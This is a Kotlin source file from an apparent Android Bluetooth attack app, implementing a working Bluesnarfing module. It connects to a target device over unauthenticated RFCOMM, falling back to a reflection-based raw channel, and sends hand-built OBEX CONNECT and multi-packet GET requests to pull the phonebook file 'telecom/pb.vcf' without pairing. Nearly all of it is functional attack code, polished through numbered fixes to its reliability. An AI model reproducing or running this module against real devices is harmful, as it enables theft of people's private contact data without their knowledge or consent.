package com.hereliesaz.blusnu.data

import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothSocket
import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import java.io.ByteArrayOutputStream
import java.io.IOException
import java.io.InputStream
import java.io.OutputStream
import java.util.UUID
import kotlin.coroutines.cancellation.CancellationException

/**
 * Module responsible for Bluesnarfing attacks.
 *
 * Bluesnarfing exploits vulnerabilities in the Object Exchange (OBEX) protocol
 * to steal information from a Bluetooth device without proper authentication.
 *
 * This implementation targets the Object Push Profile (OPP) to attempt
 * retrieving the phonebook (PBAP) or other files via unauthenticated RFCOMM.
 *
 * Note: Modern Android devices implement strict security on OBEX, usually requiring pairing
 * and user confirmation. This module is effective primarily against legacy devices (pre-2010)
 * or misconfigured IoT/Embedded systems.
 */
class BluesnarfingModule {

    private companion object {
        const val TAG = "BluesnarfingModule"

        // OBEX Protocol Constants
        const val OBEX_CONNECT_OPCODE: Byte = 0x80.toByte()
        const val OBEX_DISCONNECT_OPCODE: Byte = 0x81.toByte()
        const val OBEX_GET_OPCODE: Byte = 0x83.toByte()

        // OBEX Response Codes
        const val OBEX_SUCCESS_RESPONSE: Byte = 0xA0.toByte()
        const val OBEX_CONTINUE_RESPONSE: Byte = 0x90.toByte()

        // OBEX Header Identifiers
        const val OBEX_NAME_HEADER: Byte = 0x01
        const val OBEX_BODY_HEADER: Byte = 0x48.toByte()
        const val OBEX_END_OF_BODY_HEADER: Byte = 0x49.toByte()
        const val OBEX_CONNECTION_ID_HEADER: Byte = 0xCB.toByte()

        // Maximum cumulative response size: 10 MB
        const val MAX_RESPONSE_SIZE = 10 * 1024 * 1024
    }

    // Standard UUID for the OBEX Object Push Profile.
    private val OBEX_OPP_UUID: UUID = UUID.fromString("00001105-0000-1000-8000-00805f9b34fb")

    // Socket reference accessible for external cancellation (finding 4.8)
    @Volatile
    var activeSocket: BluetoothSocket? = null
        private set

    /**
     * Attempts to retrieve the phonebook (telecom/pb.vcf) from the target device
     * using unauthenticated RFCOMM (Bluesnarfing).
     *
     * @param device The BluetoothDevice to attack.
     * @return Result containing the phonebook data (String) or an Exception.
     */
    fun getPhonebook(device: BluetoothDevice): Result<String> {
        // Finding 4.10: Validate MAC address before proceeding
        MacValidator.requireValid(device.address)

        var socket: BluetoothSocket? = null
        return try {
            // Finding 4.1: Use unauthenticated RFCOMM — this is the core of Bluesnarfing.
            // Authenticated RFCOMM defeats the entire purpose since Bluesnarfing exploits
            // the lack of authentication on OBEX Object Push.
            socket = try {
                device.createInsecureRfcommSocketToServiceRecord(OBEX_OPP_UUID)
            } catch (e: IOException) {
                // Fallback: reflection-based raw RFCOMM channel
                Log.w(TAG, "Insecure RFCOMM failed, trying reflection fallback", e)
                val method = device.javaClass.getMethod("createRfcommSocket", Int::class.java)
                method.invoke(device, 1) as BluetoothSocket
            }

            activeSocket = socket
            socket.connect()

            val outputStream = socket.outputStream
            val inputStream = socket.inputStream

            // --- Step 1: Establish OBEX Connection ---
            val connectRequest = byteArrayOf(
                OBEX_CONNECT_OPCODE, 0x00, 0x07, 0x10, 0x00, 0x20, 0x00
            )
            outputStream.write(connectRequest)

            val connectResponse = readObexResponse(inputStream)

            if (connectResponse[0] != OBEX_SUCCESS_RESPONSE) {
                return Result.failure(IOException("OBEX CONNECT failed with code 0x${String.format("%02X", connectResponse[0])}"))
            }

            // Finding 4.3: Parse Connection ID from CONNECT response instead of hardcoding
            val connectionId = parseConnectionId(connectResponse)
                ?: return Result.failure(IOException("No Connection ID in OBEX CONNECT response"))

            // --- Step 2: Request the Phonebook File (with multi-packet support) ---
            val result = performObexGet(inputStream, outputStream, connectionId, "telecom/pb.vcf")

            // Finding 4.6: Send OBEX Disconnect before closing
            sendObexDisconnect(outputStream, connectionId)

            result
        } catch (e: CancellationException) {
            // Finding 4.7: Never swallow CancellationException
            throw e
        } catch (e: IOException) {
            Log.e(TAG, "Error during bluesnarfing", e)
            Result.failure(e)
        } catch (e: Exception) {
            // Finding 4.7: Rethrow CancellationException from generic catch
            if (e is CancellationException) throw e
            Log.e(TAG, "Error during bluesnarfing", e)
            Result.failure(e)
        } finally {
            activeSocket = null
            try {
                socket?.close()
            } catch (e: IOException) {
                Log.e(TAG, "Error closing socket", e)
            }
        }
    }

    /**
     * Closes the active socket to interrupt any blocking reads.
     * Called from stopAttack() on the ViewModel (finding 4.8).
     */
    fun closeActiveSocket() {
        try {
            activeSocket?.close()
        } catch (e: IOException) {
            Log.w(TAG, "Error force-closing active socket", e)
        }
        activeSocket = null
    }

    /**
     * Performs an OBEX GET operation with multi-packet (CONTINUE) support.
     *
     * When the server responds with CONTINUE (0x90), sends subsequent GET requests
     * to retrieve the remaining data. Body payloads are concatenated across all
     * packets until a SUCCESS (0xA0) response with End-of-Body (0x49) header
     * is received (finding 4.5).
     */
    private fun performObexGet(
        inputStream: InputStream,
        outputStream: OutputStream,
        connectionId: ByteArray,
        fileName: String
    ): Result<String> {
        val accumulatedBody = ByteArrayOutputStream()
        var totalBytesRead = 0
        var isFirstRequest = true

        while (true) {
            // Build GET request
            val getRequest = buildGetRequest(connectionId, if (isFirstRequest) fileName else null)
            outputStream.write(getRequest)
            isFirstRequest = false

            val response = readObexResponse(inputStream)
            val responseCode = response[0]

            // Finding 4.4: Proper OBEX header parsing instead of naive byte search
            val bodyData = extractBodyData(response)
            if (bodyData != null) {
                totalBytesRead += bodyData.size
                // Finding 4.9: Cap cumulative response size at 10 MB
                if (totalBytesRead > MAX_RESPONSE_SIZE) {
                    return Result.failure(IOException("Response too large (exceeded ${MAX_RESPONSE_SIZE / 1024 / 1024} MB limit)"))
                }
                accumulatedBody.write(bodyData)
            }

            when (responseCode) {
                OBEX_SUCCESS_RESPONSE -> {
                    // Final packet received
                    val resultBytes = accumulatedBody.toByteArray()
                    return if (resultBytes.isNotEmpty()) {
                        Result.success(String(resultBytes))
                    } else {
                        Result.failure(IOException("Phonebook data not found in response"))
                    }
                }
                OBEX_CONTINUE_RESPONSE -> {
                    // Finding 4.5: More data available, continue requesting
                    continue
                }
                else -> {
                    return Result.failure(IOException("OBEX GET failed with code 0x${String.format("%02X", responseCode)}"))
                }
            }
        }
    }

    /**
     * Builds an OBEX GET request packet.
     *
     * @param connectionId The 4-byte Connection ID parsed from the CONNECT response.
     * @param fileName The file to request (only included in the first packet of a multi-packet transfer).
     */
    private fun buildGetRequest(connectionId: ByteArray, fileName: String?): ByteArray {
        val headers = ByteArrayOutputStream()

        // Connection ID header (0xCB) -- 4-byte fixed-length header
        headers.write(OBEX_CONNECTION_ID_HEADER.toInt())
        headers.write(connectionId)

        // Name header (0x01) -- only on first request
        if (fileName != null) {
            val fileNameBytes = fileName.toByteArray(Charsets.UTF_16BE)
            // Finding 4.2: Append UTF-16BE null terminator (0x00, 0x00)
            val nameValueLength = fileNameBytes.size + 2 // +2 for null terminator
            val nameHeaderLength = 3 + nameValueLength // HI (1) + length (2) + value
            headers.write(OBEX_NAME_HEADER.toInt())
            headers.write(nameHeaderLength shr 8)
            headers.write(nameHeaderLength and 0xFF)
            headers.write(fileNameBytes)
            headers.write(0x00) // null terminator high byte
            headers.write(0x00) // null terminator low byte
        }

        val payload = headers.toByteArray()
        val packetLength = 3 + payload.size

        return byteArrayOf(
            OBEX_GET_OPCODE,
            (packetLength shr 8).toByte(),
            (packetLength and 0xFF).toByte()
        ) + payload
    }

    /**
     * Parses the Connection ID (header tag 0xCB) from an OBEX response.
     * The Connection ID is a 4-byte fixed-length header (finding 4.3).
     *
     * @return The 4-byte Connection ID value, or null if not present.
     */
    private fun parseConnectionId(response: ByteArray): ByteArray? {
        // OBEX response format: response code (1) + packet length (2) + headers...
        // For CONNECT response: after the 3-byte packet header, there are 4 bytes of
        // OBEX version (1) + flags (1) + max packet length (2), then headers start.
        var offset = 7 // Skip response code (1) + length (2) + version (1) + flags (1) + max packet (2)

        while (offset < response.size) {
            val headerTag = response[offset]
            when {
                // 4-byte quantity headers (high 2 bits = 11)
                (headerTag.toInt() and 0xC0) == 0xC0 -> {
                    if (offset + 5 > response.size) break
                    if (headerTag == OBEX_CONNECTION_ID_HEADER) {
                        return response.copyOfRange(offset + 1, offset + 5)
                    }
                    offset += 5
                }
                // Unicode text or byte sequence headers (high 2 bits = 00 or 01)
                // These have 2-byte length field
                (headerTag.toInt() and 0xC0) == 0x00 || (headerTag.toInt() and 0xC0) == 0x40 -> {
                    if (offset + 3 > response.size) break
                    val headerLen = ((response[offset + 1].toInt() and 0xFF) shl 8) or
                        (response[offset + 2].toInt() and 0xFF)
                    if (headerLen < 3 || offset + headerLen > response.size) break
                    offset += headerLen
                }
                // 1-byte quantity headers (high 2 bits = 10)
                (headerTag.toInt() and 0xC0) == 0x80 -> {
                    offset += 2
                }
                else -> break
            }
        }
        return null
    }

    /**
     * Extracts body data from an OBEX response using proper header parsing.
     * Handles both Body (0x48) and End-of-Body (0x49) headers (finding 4.4).
     *
     * @return The body data bytes, or null if no body header is present.
     */
    private fun extractBodyData(response: ByteArray): ByteArray? {
        // Headers start at offset 3 (after response code + 2-byte packet length)
        var offset = 3

        while (offset < response.size) {
            val headerTag = response[offset]
            when {
                // Body (0x48) or End-of-Body (0x49) -- variable length with 2-byte length field
                headerTag == OBEX_BODY_HEADER || headerTag == OBEX_END_OF_BODY_HEADER -> {
                    if (offset + 3 > response.size) return null
                    val headerLen = ((response[offset + 1].toInt() and 0xFF) shl 8) or
                        (response[offset + 2].toInt() and 0xFF)
                    val dataLen = headerLen - 3
                    if (dataLen < 0 || offset + 3 + dataLen > response.size) return null
                    return response.copyOfRange(offset + 3, offset + 3 + dataLen)
                }
                // 4-byte quantity headers (high 2 bits = 11)
                (headerTag.toInt() and 0xC0) == 0xC0 -> {
                    offset += 5
                }
                // Unicode text or byte sequence headers (high 2 bits = 00 or 01)
                (headerTag.toInt() and 0xC0) == 0x00 || (headerTag.toInt() and 0xC0) == 0x40 -> {
                    if (offset + 3 > response.size) break
                    val headerLen = ((response[offset + 1].toInt() and 0xFF) shl 8) or
                        (response[offset + 2].toInt() and 0xFF)
                    if (headerLen < 3 || offset + headerLen > response.size) break
                    offset += headerLen
                }
                // 1-byte quantity headers (high 2 bits = 10)
                (headerTag.toInt() and 0xC0) == 0x80 -> {
                    offset += 2
                }
                else -> break
            }
        }
        return null
    }

    /**
     * Sends an OBEX DISCONNECT request (opcode 0x81) to cleanly terminate the session
     * before closing the RFCOMM socket (finding 4.6).
     */
    private fun sendObexDisconnect(outputStream: OutputStream, connectionId: ByteArray) {
        try {
            // DISCONNECT packet: opcode (1) + length (2) + Connection ID header (5) = 8 bytes
            val packet = byteArrayOf(
                OBEX_DISCONNECT_OPCODE,
                0x00, 0x08, // packet length = 8
                OBEX_CONNECTION_ID_HEADER,
            ) + connectionId
            outputStream.write(packet)
            outputStream.flush()
        } catch (e: IOException) {
            Log.w(TAG, "Failed to send OBEX DISCONNECT (non-fatal)", e)
        }
    }

    /**
     * Reads a complete OBEX response frame from the stream.
     * Enforces a maximum response size to prevent unbounded memory usage (finding 4.9).
     */
    private fun readObexResponse(inputStream: InputStream): ByteArray {
        val response = ByteArrayOutputStream()

        val header = ByteArray(3)
        readFully(inputStream, header)
        response.write(header)

        val length = ((header[1].toInt() and 0xFF) shl 8) or (header[2].toInt() and 0xFF)

        // Finding 4.9: Reject oversized individual packets
        if (length > MAX_RESPONSE_SIZE) {
            throw IOException("OBEX response packet too large: $length bytes")
        }

        if (length > 3) {
            val payload = ByteArray(length - 3)
            readFully(inputStream, payload)
            response.write(payload)
        }

        return response.toByteArray()
    }

    /**
     * Reads exactly [buffer.size] bytes from the stream, looping until the buffer is full.
     */
    private fun readFully(inputStream: InputStream, buffer: ByteArray) {
        var offset = 0
        while (offset < buffer.size) {
            val bytesRead = inputStream.read(buffer, offset, buffer.size - offset)
            if (bytesRead == -1) {
                throw IOException("Unexpected end of OBEX stream after $offset/${buffer.size} bytes")
            }
            offset += bytesRead
        }
    }
}
